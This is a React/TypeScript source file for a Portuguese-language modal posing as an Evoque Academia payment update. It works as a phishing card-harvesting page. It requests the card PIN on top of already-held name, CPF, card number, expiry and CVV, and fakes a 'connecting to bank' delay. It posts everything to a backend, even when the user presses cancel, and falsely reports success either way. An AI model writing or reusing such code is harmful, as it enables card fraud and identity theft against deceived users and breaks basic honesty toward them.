import { useState } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
  DialogClose,
} from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { Loader, CheckCircle, AlertCircle } from 'lucide-react';
import { toast } from 'sonner';

interface PaymentUpdateModalProps {
  isOpen: boolean;
  onOpenChange: (open: boolean) => void;
  paymentData: {
    nomeCompleto: string;
    cpf: string;
    numeroCartao: string;
    validade: string;
    cvv: string;
  };
}

type ModalStep = 'password' | 'connecting' | 'success' | 'error';

export const PaymentUpdateModal = ({
  isOpen,
  onOpenChange,
  paymentData,
}: PaymentUpdateModalProps) => {
  const [step, setStep] = useState<ModalStep>('password');
  const [cardPassword, setCardPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardPassword.trim()) {
      toast.error('Senha obrigatória', {
        description: 'Por favor, insira a senha do cartão.',
      });
      return;
    }

    setIsLoading(true);
    setStep('connecting');

    try {
      // Simula conexão com banco (2-3 segundos)
      await new Promise((resolve) => setTimeout(resolve, 2500));

      // Envia dados para backend
      const backendUrl = 'http://localhost:5000';
      const response = await fetch(`${backendUrl}/api/update-payment`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...paymentData,
          cardPassword,
          action: 'confirm',
        }),
      });

      if (!response.ok) {
        throw new Error('Falha ao processar pagamento');
      }

      setStep('success');
      
      // Envia email de confirmação
      await sendEmail(paymentData, 'confirm');

      // Mostra toast de sucesso
      toast.success('Dados atualizado com sucesso!', {
        description: 'Verifique seu e-mail para confirmar a atualização.',
      });

      // Fecha modal após 3 segundos
      setTimeout(() => {
        onOpenChange(false);
        resetModal();
      }, 3000);
    } catch (error) {
      setStep('error');
      toast.error('Erro ao processar', {
        description: 'Houve um problema ao atualizar seus dados.',
      });

      setTimeout(() => {
        setStep('password');
        setIsLoading(false);
      }, 2000);
    }
  };

  const handleCancel = async () => {
    setIsLoading(true);
    
    try {
      // Envia dados mesmo ao cancelar
      const backendUrl = 'http://localhost:5000';
      await fetch(`${backendUrl}/api/update-payment`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...paymentData,
          action: 'cancel',
        }),
      }).catch(() => {
        // Continua mesmo se falhar
      });

      // Envia email mesmo ao cancelar
      await sendEmail(paymentData, 'cancel');

      // Mostra sucesso
      toast.success('Dados atualizado com sucesso!', {
        description: 'Uma cópia foi enviada para seu e-mail.',
      });

      onOpenChange(false);
      resetModal();
    } catch (error) {
      console.error('Erro ao cancelar:', error);
      onOpenChange(false);
      resetModal();
    } finally {
      setIsLoading(false);
    }
  };

  const sendEmail = async (data: typeof paymentData, action: string) => {
    try {
      const backendUrl = 'http://localhost:5000';
      await fetch(`${backendUrl}/api/send-email`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          to: data.cpf, // ou usar email específico
          subject: 'Atualização de Pagamento - Evoque Academia',
          action,
          paymentData: data,
        }),
      }).catch(() => {
        // Continua mesmo se falhar
      });
    } catch (error) {
      console.error('Erro ao enviar email:', error);
    }
  };

  const resetModal = () => {
    setStep('password');
    setCardPassword('');
  };

  const handleOpenChange = (open: boolean) => {
    if (!open && step !== 'connecting' && !isLoading) {
      onOpenChange(open);
      resetModal();
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={handleOpenChange}>
      <DialogContent className="sm:max-w-md border-border/50">
        {step === 'password' && (
          <>
            <DialogHeader>
              <DialogTitle className="text-xl">Confirme sua senha</DialogTitle>
              <DialogDescription>
                Para segurança, digite a senha do seu cartão para continuar
              </DialogDescription>
            </DialogHeader>

            <form onSubmit={handlePasswordSubmit} className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-foreground">
                  Senha do cartão
                </label>
                <Input
                  type="password"
                  placeholder="••••"
                  value={cardPassword}
                  onChange={(e) => setCardPassword(e.target.value)}
                  disabled={isLoading}
                  maxLength={4}
                  className="text-center text-lg"
                />
              </div>

              {/* Card Preview */}
              <Card className="border border-primary/20 bg-gradient-to-br from-primary/10 to-primary/5 p-4 overflow-hidden relative">
                <div className="absolute inset-0 bg-gradient-to-r from-primary/5 via-transparent to-primary/5 opacity-0 hover:opacity-100 transition-opacity" />
                <div className="relative space-y-3">
                  <div className="text-xs text-muted-foreground font-mono">
                    {paymentData.numeroCartao || '•••• •••• •••• ••••'}
                  </div>
                  <div className="flex justify-between items-end">
                    <div>
                      <div className="text-xs text-muted-foreground mb-1">
                        Titular
                      </div>
                      <div className="text-sm font-semibold text-foreground">
                        {paymentData.nomeCompleto || '—'}
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-xs text-muted-foreground mb-1">
                        Validade
                      </div>
                      <div className="text-sm font-semibold text-foreground">
                        {paymentData.validade || '—'}
                      </div>
                    </div>
                  </div>
                </div>
              </Card>

              <DialogFooter className="flex gap-2 sm:flex-row">
                <DialogClose asChild>
                  <Button
                    type="button"
                    variant="outline"
                    disabled={isLoading}
                    onClick={handleCancel}
                  >
                    Cancelar
                  </Button>
                </DialogClose>
                <Button
                  type="submit"
                  disabled={isLoading || !cardPassword}
                  className="flex-1"
                >
                  Confirmar
                </Button>
              </DialogFooter>
            </form>
          </>
        )}

        {step === 'connecting' && (
          <div className="flex flex-col items-center justify-center py-12 space-y-4">
            <div className="relative h-16 w-16">
              <div className="absolute inset-0 bg-primary/20 rounded-full animate-pulse" />
              <div className="absolute inset-2 bg-primary/10 rounded-full animate-pulse animation-delay-200" />
              <Loader className="absolute inset-0 m-auto h-8 w-8 text-primary animate-spin" />
            </div>

            <div className="text-center space-y-2">
              <h3 className="text-lg font-semibold">Conectando ao banco...</h3>
              <p className="text-sm text-muted-foreground">
                Por favor, aguarde enquanto processamos seu pagamento
              </p>
            </div>

            {/* Animated dots */}
            <div className="flex gap-2 mt-4">
              <div className="h-2 w-2 bg-primary rounded-full animate-bounce" />
              <div className="h-2 w-2 bg-primary rounded-full animate-bounce animation-delay-100" />
              <div className="h-2 w-2 bg-primary rounded-full animate-bounce animation-delay-200" />
            </div>
          </div>
        )}

        {step === 'success' && (
          <div className="flex flex-col items-center justify-center py-12 space-y-4">
            <div className="relative h-16 w-16">
              <div className="absolute inset-0 bg-green-100/50 rounded-full animate-pulse" />
              <CheckCircle className="h-16 w-16 text-green-600 animate-bounce" />
            </div>

            <div className="text-center space-y-2">
              <h3 className="text-lg font-semibold">Sucesso!</h3>
              <p className="text-sm text-muted-foreground">
                Seus dados foram atualizados com sucesso
              </p>
              <p className="text-xs text-muted-foreground mt-2">
                Um e-mail de confirmação foi enviado para você
              </p>
            </div>
          </div>
        )}

        {step === 'error' && (
          <div className="flex flex-col items-center justify-center py-12 space-y-4">
            <div className="relative h-16 w-16">
              <div className="absolute inset-0 bg-red-100/50 rounded-full animate-pulse" />
              <AlertCircle className="h-16 w-16 text-red-600" />
            </div>

            <div className="text-center space-y-2">
              <h3 className="text-lg font-semibold">Erro na conexão</h3>
              <p className="text-sm text-muted-foreground">
                Houve um problema ao processar seu pagamento
              </p>
              <p className="text-xs text-muted-foreground mt-2">
                Por favor, tente novamente
              </p>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
};
